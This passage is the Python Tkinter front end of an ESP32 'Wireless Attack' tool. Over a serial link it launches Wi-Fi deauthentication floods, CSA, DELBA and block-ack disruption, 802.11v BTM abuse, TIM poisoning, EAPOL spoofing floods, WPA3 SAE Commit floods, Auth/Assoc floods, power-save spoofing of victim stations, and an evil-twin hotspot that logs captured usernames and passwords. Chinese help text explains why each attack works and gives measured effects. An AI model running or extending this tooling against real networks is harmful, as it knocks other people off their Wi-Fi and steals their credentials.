                  "• 克隆 beacon 每 20 ms 一帧（真 AP 100 TU≈102 ms），是广播帧，不占单播缓存池；\n"
                  "• TSF 投毒已删除：beacon 的时间戳字段由 MAC 用自己的 TSF 覆盖，写什么都上不了空口；\n"
                  "• 底栏：timf 帧数、timaid 学到的 AID 位图、timreal 学到的真 beacon 数。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_eapol_page(self):
        page = self._make_page()
        ttk.Label(page, text="EAPOL-Start / Logoff 洪泛",
                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="伪造成受害 STA 发 EAPOL-Start / Logoff（ToDS 数据帧 + LLC/SNAP 0x888E），"
                 "反复重起 AP 的 802.1X 状态机 / 把端口打回未授权态。",
            foreground="#777777", wraplength=920, justify="left",
        ).pack(anchor="w", pady=(0, 8))
        self._target_bar(page, "eapol")

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, text="QoS TID：").pack(side="left")
        ttk.Combobox(params, textvariable=self.eapol_tid_var, values=EAPOL_TIDS,
                     state="readonly", width=40).pack(side="left")
        ttk.Label(params, text="  受害 STA MAC（空=嗅探学习）：").pack(side="left")
        ttk.Entry(params, textvariable=self.eapol_mac_var, width=14).pack(side="left")

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始洪泛", width=14, command=self.start_eapol).pack(side="left")
        ttk.Button(actions, text="停止", width=10, command=self.eapol_stop).pack(side="left", padx=8)

        ttk.Label(
            page,
            text=("说明：\n"
                  "• MAC 填 12 位十六进制、不带冒号（例如 02AABBCCDDEE）；留空就只打嗅探到的真实 STA；\n"
                  "• 非 QoS 与 QoS（TID 由上表决定）两种帧交替发，每 50 ms 一帧、轮转受害者，"
                  "单播注入上限 20 帧/s；\n"
                  "• WPA2-Enterprise 语义最完整；WPA2-PSK 下是否有效取决于 AP 实现，实测这台 AP 无效；\n"
                  "• 判据在对端：eaprxreq（AP 发回的 EAP-Request/Identity）>0 才算把状态机踢动了，"
                  "eaprxsta 是真实 STA 重新认证的帧数。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_sae_page(self):
        page = self._make_page()
        ttk.Label(page, text="SAE Commit 洪泛（WPA3 DoS）",
                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="向 WPA3-SAE 的 AP 灌伪造 Authentication Commit：每个身份一个 ECC 标量乘。"
                 "AP 用反 clogging token（status 76）时，模块会把 token 原样回显再送一次。",
            foreground="#777777", wraplength=920, justify="left",
        ).pack(anchor="w", pady=(0, 8))
        self._target_bar(page, "sae")

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, text="Commit 元素：").pack(side="left")
        ttk.Combobox(params, textvariable=self.sae_elem_var, values=SAE_ELEMS,
                     state="readonly", width=40).pack(side="left")
        ttk.Label(params, text="  帧间隔 ms：").pack(side="left")
        ttk.Entry(params, textvariable=self.sae_gap_var, width=6).pack(side="left")
        ttk.Label(params, text="   （低于 50 会被固件抬到 50）", foreground="#555555").pack(side="left")

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始洪泛", width=14, command=self.start_sae).pack(side="left")
        ttk.Button(actions, text="停止", width=10, command=self.sae_stop).pack(side="left", padx=8)

        ttk.Label(
            page,
            text=("说明：\n"
                  "• saesec 是嗅探判定的目标安全类型：只对 wpa3-sae / wpa2/wpa3 有意义，"
                  "wpa2-psk 上 AP 不会做 ECC 运算；\n"
                  "• point 用 P-256 生成元（合法点），AP 才会走到标量乘；rand 是对照组；\n"
                  "• 每个身份发 4 帧后换随机 MAC，最多 8 个身份在轮转；\n"
                  "• 底栏：saef 帧数、saec 身份数、saeresp AP 回帧数、saecode 最后状态码"
                  "（76=要 token、0/13=其他）、saetok token 数、saeecho 带 token 的帧数。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_authflood_page(self):
        page = self._make_page()
        ttk.Label(page, text="Auth / Assoc 洪泛（WPA3 自动升级 SAE）",
                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="每个随机身份先发 Authentication 再发 Association Request，挤占 AP 的 station 表；"
                 "嗅到目标 AKM 是 SAE 时自动改成 SAE Commit 洪泛。",
            foreground="#777777", wraplength=920, justify="left",
        ).pack(anchor="w", pady=(0, 8))
        self._target_bar(page, "authflood")

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, text="模式：").pack(side="left")
        ttk.Combobox(params, textvariable=self.auth_mode_var, values=AUTH_MODES,
                     state="readonly", width=40).pack(side="left")
        ttk.Checkbutton(params, text="嗅到 WPA3 自动升级 SAE",
                        variable=self.auth_auto_var).pack(side="left", padx=12)

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始洪泛", width=14, command=self.start_authflood).pack(side="left")
        ttk.Button(actions, text="停止", width=10,
                   command=self.authflood_stop).pack(side="left", padx=8)

        ttk.Label(
            page,
            text=("说明：\n"
                  "• Association Request 带目标自己的 SSID 和 RSN 元素（嗅探自 beacon），"
                  "否则 AP 在查 station 表之前就拒了，洪泛等于白打；\n"
                  "• 每次成功发一帧就换一个新身份；afids 是身份数、afs 是 AP 的回帧数；\n"
                  "• afst 是最后一次状态码：0=接受了我们的伪造身份、13=不做开放认证、"
                  "17=station 表满；afup=1 表示已升级为 SAE 洪泛；\n"
                  "• 关掉“自动升级”就只打 Auth/Assoc（对照组）。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_pspoll_page(self):
        page = self._make_page()
        ttk.Label(page, text="PS-Poll / 电源管理欺骗（伪造 PM 位与省电取帧）",
                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
        ttk.Label(
            page,
            text="用受害 STA 的 MAC 伪造 PM=1 的 Null Data：AP 以为它睡着了，把下行缓存进 TIM，"
                 "而真站醒着、永远不取，于是收不到。PM 位在数据帧的帧控制里，不属于 PMF 保护集，"
                 "强制 PMF 的 WPA3 网络照样成立。",
            foreground="#777777", wraplength=920, justify="left",
        ).pack(anchor="w", pady=(0, 8))
        self._target_bar(page, "pspoll")

        params = ttk.Frame(page)
        params.pack(fill="x", pady=(4, 6))
        ttk.Label(params, text="受害 STA MAC（空=嗅探学习）：").pack(side="left")
        ttk.Entry(params, textvariable=self.pspoll_mac_var, width=16).pack(side="left")
        ttk.Label(params, text="   每第 6 帧发一次 PM=0 把缓存“放”掉",
                  foreground="#555555").pack(side="left")

        actions = ttk.Frame(page)
        actions.pack(fill="x", pady=(6, 4))
        ttk.Button(actions, text="开始欺骗", width=14, command=self.start_pspoll).pack(side="left")
        ttk.Button(actions, text="停止", width=10,
                   command=self.pspoll_stop).pack(side="left", padx=8)
        ttk.Button(actions, text="解除（发 PM=0）", width=16,
                   command=self.pspoll_release).pack(side="left")

        ttk.Label(
            page,
            text=("说明：\n"
                  "• 帧是单播、要 ACK，节拍 10 帧/s：20 帧/s 时这块驱动的短缓存池会在"
                  "几百帧后打满并触发 0x101 重启（实测）；\n"
                  "• AID/PS-Poll 那一半已删除：单播的子类型 10 帧发不出去（实测 0/10 上空气），"
                  "详见 attack-principles.md 附录 A；\n"
                  "• 判据：pspdl 是我们听到的、发给受害者的下行数据帧数；欺骗生效时它应当停止增长；\n"
                  "• 边界：实活站每秒都在发 PM=0 的上行帧，会把 AP 抢回“醒着”状态，所以效果是"
                  "下行吞吐下降（实测 -24%）、不断连；AP 也会老化/重传耗尽后丢弃缓存帧。"),
            justify="left",
        ).pack(anchor="w", pady=(12, 0))
        return page

    def _build_status_page(self):
        page = self._make_page()
        ttk.Button(page, text="刷新", width=10,
                   command=lambda: self._send("STATUS")).pack(anchor="w", pady=(8, 0))
        self.status_text = tk.Text(page, height=12, wrap="word", state="disabled")
        self.status_text.pack(fill="both", expand=True, pady=8)
        return page

    def _build_log_page(self):
        page = self._make_page()
        self.log_text = tk.Text(page, height=18, wrap="none", state="disabled")
        self.log_text.pack(side="left", fill="both", expand=True)
        scroll = ttk.Scrollbar(page, orient="vertical", command=self.log_text.yview)
        scroll.pack(side="right", fill="y")
        self.log_text.configure(yscrollcommand=scroll.set)
        self.log_text.tag_configure("tx", foreground="#0b6bcb")
        self.log_text.tag_configure("err", foreground="#c0392b")
        self.log_text.tag_configure("info", foreground="#777777")
        return page

    # ---------------------------------------------------------------- 导航

    def go_back(self):
        parent = {"one": "deauth", "all": "deauth", "only": "deauth", "except": "deauth"}
        for key in ("deauth", "probe", "csa", "delba", "ba", "evil", "wnm", "tim", "eapol",
                    "sae", "authflood", "pspoll", "status", "log"):
            parent[key] = "home"
        self.show_page(parent.get(self.current_page, "home"))

    def show_page(self, key):
        for name, frame in self.pages.items():
            if name == key:
                frame.pack(fill="both", expand=True)
            else:
                frame.pack_forget()
        self.current_page = key
        self.back_btn.config(state="normal" if key != "home" else "disabled")
        titles = dict(MENU + [("home", "主菜单")])
        titles.update({k: f"Deauth · {label}" for k, label, _n, _h in DEAUTH_MODES})
        titles.update({"wnm": "802.11v BTM Request", "tim": "TIM 投毒",
                       "eapol": "EAPOL-Start/Logoff 洪泛", "sae": "SAE Commit 洪泛",
                       "authflood": "Auth/Assoc 洪泛", "pspoll": "PM 位欺骗（电源管理）"})
        self.page_title.config(text=titles.get(key, key))
        self._refresh_labels()

    # ---------------------------------------------------------------- 串口

    def _refresh_ports(self):
        ports = sorted(list_ports.comports(), key=lambda p: (0 if p.vid == 0x1A86 else 1, p.device))
        values = [f"{p.device} - {p.description}" for p in ports]
        self.port_combo["values"] = values
        if values and not self.port_var.get():
            self.port_var.set(values[0])

    def _selected_port(self):
        raw = self.port_var.get()
        return raw.split(" - ")[0].strip() if raw else ""

    def connect(self):
        if self.link:
            return
        port = self._selected_port()
        if not port:
            messagebox.showwarning("提示", "没有可用串口，请插入开发板后点“刷新”。")
            return
        try:
            self.link = SerialLink(port, self.events)
        except Exception as exc:  # noqa: BLE001
            messagebox.showerror("连接失败", f"{port} 打开失败：{exc}")
            return
        self._log(f"已连接 {port}", "info")
        self.connect_btn.config(state="disabled")
        self.disconnect_btn.config(state="normal")
        self._set_button_state(self.scan_btns, "normal")
        self._set_button_state(self.target_btns, "normal")
        self.status_var.set("已连接，等待固件响应…")
        self.root.after(400, self._handshake)
        self.root.after(2000, self._poll_status)

    @staticmethod
    def _set_button_state(buttons, state):
        for btn in buttons.values():
            btn.config(state=state)

    def _handshake(self):
        if self.link:
            self._send("PING")
            self._send("STATUS")

    def disconnect(self):
        if self.dialog is not None:
            self.close_targets()
        if self.link:
            self.link.close()
            self.link = None
            self._log("已断开", "info")
        self.connect_btn.config(state="normal")
        self.disconnect_btn.config(state="disabled")
        self._set_button_state(self.scan_btns, "disabled")
        self._set_button_state(self.target_btns, "disabled")
        for widget in (self.twin_btn, self.twin_stop_btn, self.creds_btn):
            widget.config(state="disabled")
        self.status_var.set("未连接")

    def _send(self, command):
        if not self.link:
            return
        self.link.send(command)
        self._log(f">> {command}", "tx")

    def _require_link(self):
        if not self.link:
            messagebox.showinfo("提示", "请先连接串口。")
            return False
        return True

    def _poll_status(self):
        if self.link:
            self.link.send("STATUS")
            if self.attacking:
                self.link.send("STATS")
            self.root.after(2000, self._poll_status)

    # ---------------------------------------------------------- 目标弹窗

    def open_targets(self, multi):
        if not self._require_link():
            return
        if self.dialog is not None:
            self.dialog.lift()
            self.dialog.focus_force()
            return
        if not self.networks:
            messagebox.showinfo("提示", "先点“扫描 AP”，扫到网络后再选目标。")
            return
        title = "选择目标 AP（勾选，可多选）" if multi else "选择目标 AP（单选）"
        self.dialog = TargetDialog(self, multi, title)

    def close_targets(self):
        if self.dialog is not None:
            self.dialog.grab_release()
            self.dialog.destroy()
            self.dialog = None
        self._refresh_labels()

    # ---------------------------------------------------------------- 标签

    def _refresh_labels(self):
        picked = ",".join(sorted(self.picked, key=int))
        single = self.single_index
        for key, _label, needs_pick, _hint in DEAUTH_MODES:
            widget = self.count_labels.get(key)
            if widget is None:
                continue
            if self.scanning:
                widget.config(text="扫描中…")
            elif not self.networks:
                widget.config(text="未扫描")
            elif needs_pick:
                widget.config(text=f"共 {len(self.networks)} 个 AP　已勾选 {len(self.picked)}："
                                   f"{picked or '无'}")
            elif key == "one":
                if single is None or str(single) not in self.networks:
                    widget.config(text=f"共 {len(self.networks)} 个 AP　目标：未选择")
                else:
                    ssid = self.networks[str(single)]["ssid"] or "(隐藏)"
                    widget.config(text=f"共 {len(self.networks)} 个 AP　目标：#{single} {ssid}")
            else:
                widget.config(text=f"共 {len(self.networks)} 个 AP　（全部）")
        if self.csa_label is not None:
            if not self.networks:
                self.csa_label.config(text="未扫描")
            elif single is None or str(single) not in self.networks:
                self.csa_label.config(text=f"共 {len(self.networks)} 个 AP　目标：未选择")
            else:
                ssid = self.networks[str(single)]["ssid"] or "(隐藏)"
                ch = self.networks[str(single)]["channel"]
                self.csa_label.config(text=f"目标：#{single} {ssid}（当前 ch{ch}）→ 自动对向频段")

        for key, widget in self.mod_labels.items():
            if self.scanning:
                widget.config(text="扫描中…")
            elif not self.networks:
                widget.config(text="未扫描")
            elif single is None or str(single) not in self.networks:
                widget.config(text=f"共 {len(self.networks)} 个 AP　目标：未选择")
            else:
                net = self.networks[str(single)]
                widget.config(text=f"目标：#{single} {net['ssid'] or '(隐藏)'}"
                                   f"（ch{net['channel']}）")

        if "evil" in self.count_labels:
            widget = self.count_labels["evil"]
            if self.scanning:
                widget.config(text="扫描中…")
            elif not self.networks:
                widget.config(text="未扫描")
            elif single is None or str(single) not in self.networks:
                widget.config(text=f"共 {len(self.networks)} 个 AP　目标：未选择")
            else:
                ssid = self.networks[str(single)]["ssid"] or "(隐藏)"
                widget.config(text=f"共 {len(self.networks)} 个 AP　目标：#{single} {ssid}")

    # ---------------------------------------------------------------- 动作

    def scan(self):
        if not self._require_link():
            return
        self.networks.clear()
        self.picked.clear()
        self.single_index = None
        self.scanning = True
        self._set_button_state(self.scan_btns, "disabled")
        self.status_var.set("扫描中…")
        self._refresh_labels()
        if self.dialog is not None:
            self.dialog.refresh()
        self._send("SCAN")

    def _reason_token(self):
        """把下拉框/自定义输入解析成命令行里的 reason 字段。

        返回 "random"、数字字符串；输入非法时抛 ValueError（由调用方提示）。
        """
        selection = self.reason_var.get()
        if selection.startswith("random"):
            return "random"
        if selection.startswith("custom"):
            text = self.reason_custom_var.get().strip()
            if not text:
                raise ValueError("选了“自定义”但右侧没填值。")
            try:
                value = int(text, 0)
            except ValueError:
                raise ValueError(f"自定义 reason 必须是整数，当前是 {text!r}。")
            if not 1 <= value <= 65535:
                raise ValueError(f"reason 取值必须在 1..65535，当前是 {value}。")
            if value not in REASON_DEFINED:
                if not messagebox.askyesno(
                        "确认", f"{value} 不在标准定义的 reason 集合里（1–11、13–24），\n"
                               "客户端可能直接忽略这帧。仍要使用吗？"):
                    raise ValueError("已取消。")
            return str(value)
        return selection.split(" - ")[0]

    def start_mode(self, key):
        if not self._require_link():
            return
        try:
            reason = self._reason_token()
        except ValueError as exc:
            messagebox.showerror("reason 无效", str(exc))
            return
        if not self.networks:
            messagebox.showinfo("提示", "先在本页点“扫描 AP”。")
            return
        if key == "one":
            if self.single_index is None:
                messagebox.showinfo("提示", "先点“选择目标…”选一个 AP。")
                return
            self._send(f"DEAUTH {self.single_index} {reason}")
        elif key == "all":
            if messagebox.askyesno("确认", "对扫描到的全部 AP 持续发包，会产生较大干扰，继续吗？"):
                self._send(f"DEAUTH_ALL {reason}")
        elif key == "only":
            if not self.picked:
                messagebox.showinfo("提示", "先点“选择目标…”勾选要打的 AP。")
                return
            self._send(f"DEAUTH_ONLY {self._joined_picked()} {reason}")
        elif key == "except":
            if not self.picked:
                messagebox.showinfo("提示", "先点“选择目标…”勾选要排除的 AP。")
                return
            self._send(f"DEAUTH_EXCEPT {self._joined_picked()} {reason}")

    def _joined_picked(self):
        return ",".join(sorted(self.picked, key=int))

    def start_csa(self):
        if not self._require_link():
            return
        if not self.networks:
            messagebox.showinfo("提示", "先点“扫描 AP”。")
            return
        if self.single_index is None:
            messagebox.showerror("CSA 参数无效", "先在“选择目标…”里选一个 AP。")
            return
        # No channel argument: the firmware announces a random channel from the
        # opposite band and keeps cycling until stopped.
        self._send(f"CSA {self.single_index}")

    def csa_stop(self):
        self._send("CSASTOP")

    def start_delba(self):
        if not self._require_link():
            return
        if not self.networks:
            messagebox.showinfo("提示", "先点“扫描 AP”。")
            return
        if self.single_index is None:
            messagebox.showerror("DELBA 参数无效", "先在“选择目标…”里选一个 AP。")
            return
        reason = self.delba_reason_var.get().split(" ")[0]
        self._send(f"DELBA {self.single_index} {reason}")

    def delba_stop(self):
        self._send("DELBASTOP")

    def start_ba(self):
        if not self._require_link():
            return
        if not self.networks:
            messagebox.showinfo("提示", "先点“扫描 AP”。")
            return
        if self.single_index is None:
            messagebox.showerror("BA 参数无效", "先在“选择目标…”里选一个 AP。")
            return
        step = self.ba_step_var.get().split(" ")[0]
        try:
            value = int(step)
        except ValueError:
            messagebox.showerror("BA 参数无效", "SN 步进必须是 0–2047 的整数。")
            return
        if value < 0 or value > 2047:
            messagebox.showerror("BA 参数无效", "SN 步进必须在 0–2047 之间。")
            return
        self._send(f"BAATTACK {self.single_index} {value}")

    def ba_stop(self):
        self._send("BASTOP")

    # ------------------------------------------- 802.11v / TIM / EAPOL / SAE / Auth

    def _need_single(self, title):
        if not self._require_link():
            return False
        if not self.networks:
            messagebox.showinfo("提示", "先点“扫描 AP”。")
            return False
        if self.single_index is None:
            messagebox.showerror(f"{title} 参数无效", "先在“选择目标…”里选一个 AP。")
            return False
        return True

    def start_wnm(self):
        if not self._need_single("BTM"):
            return
        mode = self.wnm_mode_var.get().split(" ")[0]
        try:
            timer = int(self.wnm_timer_var.get().strip() or "0")
            channel = int(self.wnm_ch_var.get().strip() or "0")
        except ValueError:
            messagebox.showerror("BTM 参数无效", "disassoc timer 与候选信道必须是整数。")
            return
        if not 1 <= timer <= 65535:
            messagebox.showerror("BTM 参数无效", "disassoc timer 必须在 1..65535（0 客户端不会扫）。")
            return
        if not 0 <= channel <= 196:
            messagebox.showerror("BTM 参数无效", "候选信道必须是 0（自动）或 1..196。")
            return
        command = f"WNM {self.single_index} {mode} {timer}"
        if channel:
            command += f" {channel}"
        self._send(command)

    def wnm_stop(self):
        self._send("WNMSTOP")

    def start_tim(self):
        if not self._need_single("TIM"):
            return
        mode = self.tim_mode_var.get().split(" ")[0]
        try:
            aid = int(self.tim_aid_var.get().strip() or "0")
        except ValueError:
            messagebox.showerror("TIM 参数无效", "AID 必须是整数。")
            return
        if not 0 <= aid <= 256:
            messagebox.showerror("TIM 参数无效", "AID 必须是 0（学到的全部）或 1..256。")
            return
        self._send(f"TIM {self.single_index} {mode} {aid}")

    def tim_stop(self):
        self._send("TIMSTOP")

    def start_eapol(self):
        if not self._need_single("EAPOL"):
            return
        tid = self.eapol_tid_var.get().split(" ")[0]
        mac = self.eapol_mac_var.get().strip().upper().replace(":", "").replace("-", "")
        if mac:
            if len(mac) != 12 or any(c not in "0123456789ABCDEF" for c in mac):
                messagebox.showerror("EAPOL 参数无效",
                                     "STA MAC 要 12 位十六进制（可带冒号），例如 02:AABB:CCDD:EE。")
                return
        command = f"EAPOL {self.single_index} {tid}"
        if mac:
            command += f" {mac}"
        self._send(command)

    def eapol_stop(self):
        self._send("EAPOLSTOP")

    def start_sae(self):
        if not self._need_single("SAE"):
            return
        element = self.sae_elem_var.get().split(" ")[0]
        try:
            gap = int(self.sae_gap_var.get().strip() or "0")
        except ValueError:
            messagebox.showerror("SAE 参数无效", "帧间隔必须是整数毫秒。")
            return
        if not 0 <= gap <= 1000:
            messagebox.showerror("SAE 参数无效", "帧间隔必须在 0..1000 ms。")
            return
        self._send(f"SAE {self.single_index} {element} {gap}")

    def sae_stop(self):
        self._send("SAESTOP")

    def start_authflood(self):
        if not self._need_single("Auth 洪泛"):
            return
        mode = self.auth_mode_var.get().split(" ")[0]
        command = f"AUTHFLOOD {self.single_index} {mode}"
        if not self.auth_auto_var.get():
            command += " noauto"
        self._send(command)

    def authflood_stop(self):
        self._send("AUTHFLOODSTOP")

    def start_pspoll(self):
        if not self._need_single("PM 欺骗"):
            return
        mac = self.pspoll_mac_var.get().strip().upper().replace(":", "").replace("-", "")
        if mac and (len(mac) != 12 or any(c not in "0123456789ABCDEF" for c in mac)):
            messagebox.showerror("PM 欺骗参数无效",
                                 "STA MAC 要 12 位十六进制（可带冒号），例如 02:AABB:CCDD:EE。")
            return
        command = f"PSPOLL {self.single_index}"
        if mac:
            command += f" {mac}"
        self._send(command)

    def pspoll_stop(self):
        self._send("PSPOLLSTOP")

    def pspoll_release(self):
        self._send("PSPOLLREL")

    def stop(self):
        self._send("STOP")

    def probe_broadcast(self):
        if self._require_link():
            self._send("PROBE_BROADCAST")

    def evil_twin(self):
        if self.single_index is None:
            messagebox.showinfo("提示", "先点“选择目标…”选一个要克隆的 AP。")
            return
        if messagebox.askyesno("确认", "会克隆该 SSID 并广播一个开放热点，仅用于自有网络。\n继续吗？"):
            self._send(f"EVILTWIN {self.single_index}")

    def evil_twin_stop(self):
        self._send("EVILTWIN_STOP")

    def show_creds(self):
        self._send("CREDS")

    # ---------------------------------------------------------------- 事件

    def _pump(self):
        try:
            while True:
                kind, payload = self.events.get_nowait()
                if kind == "line":
                    self._handle_line(payload)
                elif kind == "error":
                    self._log(payload, "err")
                    self.disconnect()
        except queue.Empty:
            pass
        self.root.after(60, self._pump)

    def _handle_line(self, line):
        kind, payload = protocol.classify(line)

        if kind == "net" and payload:
            self.networks[str(payload["index"])] = payload
            if self.dialog is not None:
                self.dialog.refresh()
            return
        if kind == "scan_begin":
            self._log("SCAN_BEGIN", "info")
            return
        if kind == "scan_end":
            self.scanning = False
            self._log(f"扫描完成，共 {payload} 个 AP", "info")
            self._set_button_state(self.scan_btns, "normal" if self.link else "disabled")
            self._refresh_labels()
            if self.dialog is not None:
                self.dialog.refresh()
            return
        if kind == "status":
            caps = protocol.parse_caps(payload)
            if "eviltwin" in caps and not self.supports_evil_twin:
                self.supports_evil_twin = True
                self.twin_btn.config(state="normal")
                self.creds_btn.config(state="normal")
            self.supports_5g = "5g" in caps
            mode = payload.get("mode", "?")
            self.attacking = protocol.mode_is_attacking(mode)
            self.twin_stop_btn.config(state="normal" if mode.startswith("evil") else "disabled")
            band_hint = "  双频(5G)：可用" if self.supports_5g else ""
            # 两行：第一行是“还在跑的”，第二行是五个帧级模块的计数。
            self.status_var.set(
                f"模式：{mode}    Deauth 帧：{payload.get('deauth_frames', '-')}    "
                f"Probe 帧：{payload.get('probe_frames', '-')}    "
                f"reason：{payload.get('reason', '-')}    CSA：{payload.get('csa', '-')} "
                f"({payload.get('csaf', '-')} 帧)    DELBA：{payload.get('delba', '-')} "
                f"({payload.get('delbaf', '-')} 帧 / TID {payload.get('delbat', '-')})    "
                f"BA：{'on' if payload.get('bamode') == '1' else 'off'} "
                f"({payload.get('babar', '-')} BAR / SSN {payload.get('bassn', '-')})\n"
                f"WNM：{payload.get('wnm', '-')} ({payload.get('wnmf', '-')} 帧 / "
                f"{payload.get('wnmc', '-')} 个 11v STA)    "
                f"TIM：{payload.get('tim', '-')} ({payload.get('timf', '-')} 帧 / "
                f"aid=0x{int(payload.get('timaid', '0') or '0'):X})    "
                f"EAPOL：{payload.get('eap', '-')} ({payload.get('eapf', '-')} 帧 / "
                f"AP 回 {payload.get('eaprxreq', '-')})    "
                f"PS-Poll：{payload.get('psp', '-')} ({payload.get('pspf', '-')} 帧 / "
                f"下行 {payload.get('pspdl', '-')})    "
                f"SAE：{payload.get('sae', '-')} ({payload.get('saef', '-')} 帧 / "
                f"{payload.get('saesec', '-')})    "
                f"Auth：{payload.get('af', '-')} ({payload.get('aff', '-')} 帧)    "
                f"网络：{payload.get('networks', '-')}    堆：{payload.get('heap', '-')}"
                f"{band_hint}"
            )
            self.status_text.configure(state="normal")
            self.status_text.delete("1.0", "end")
            for key in ("mode", "eliminated", "deauth_frames", "probe_frames", "networks", "creds",
                        "heap", "ui", "caps", "ch", "rx", "rxm",
                        "delba", "delbaf", "delbac", "delbat", "delbab", "delbar", "delbtr",
                        "bamode", "baaddba", "babar", "badlba", "bassn", "baerr", "baplant",
                        "wnm", "wnmf", "wnmc", "wnmskip", "wnmresp", "wnms",
                        "tim", "timf", "timaid", "timreal",
                        "eap", "eapf", "eaprx", "eaprxreq", "eaprxsta",
                        "psp", "pspf", "pspnul", "pspfl", "pspc", "pspdl",
                        "psprxp", "psprxn", "psprxpm",
                        "sae", "saesec", "saef", "saec", "saeresp", "saecode", "saetok", "saeecho",
                        "af", "aff", "afa", "afs", "afids", "afst", "afup",
                        "txg", "txgok", "txgerr"):
                if key in payload:
                    self.status_text.insert("end", f"{key:<14}{payload[key]}\n")
            self.status_text.configure(state="disabled")
            return
        if line.startswith("AP "):
            parts = line.split(" ")
            if len(parts) >= 5:
                row = (parts[1], parts[2], parts[3].lstrip("ch"), parts[4].split("=")[-1])
                for tree in self.stats_trees.values():
                    tree.insert("", "end", values=row)
            return
        if line.startswith("STATS_BEGIN"):
            for tree in self.stats_trees.values():
                tree.delete(*tree.get_children())
            return
        if kind == "cred" and payload:
            self._log(f"捕获：{payload['username']} / {payload['password']}", "err")
            return
        if kind == "ok":
            self._log("固件响应正常" if "PONG" in (payload or "") else line, "tx")
            return
        if kind == "err":
            self._log(line, "err")
            return
        if kind == "info":
            self._log(line, "info")
            return
        if kind == "raw":
            self._log(line, "info")

    def _log(self, text, tag=None):
        stamp = time.strftime("%H:%M:%S")
        self.log_text.configure(state="normal")
        self.log_text.insert("end", f"[{stamp}] {text}\n", tag or ())
        self.log_text.see("end")
        self.log_text.configure(state="disabled")

    def on_close(self):
        self.disconnect()
        self.root.destroy()


def main(argv=None):
    parser = argparse.ArgumentParser(description="ESP32 Wireless Attack 串口上位机")
    parser.add_argument("--port", help="启动后自动连接的串口，例如 COM5")
    parser.add_argument("--self-test", action="store_true", help="只创建界面并退出（自检用）")
    args = parser.parse_args(argv)

    root = tk.Tk()
    app = DeautherApp(root, autoconnect=args.port)
    if args.self_test:
        root.update_idletasks()
        root.update()
        root.destroy()
        return 0
    root.mainloop()
    return 0


if __name__ == "__main__":
    sys.exit(main())
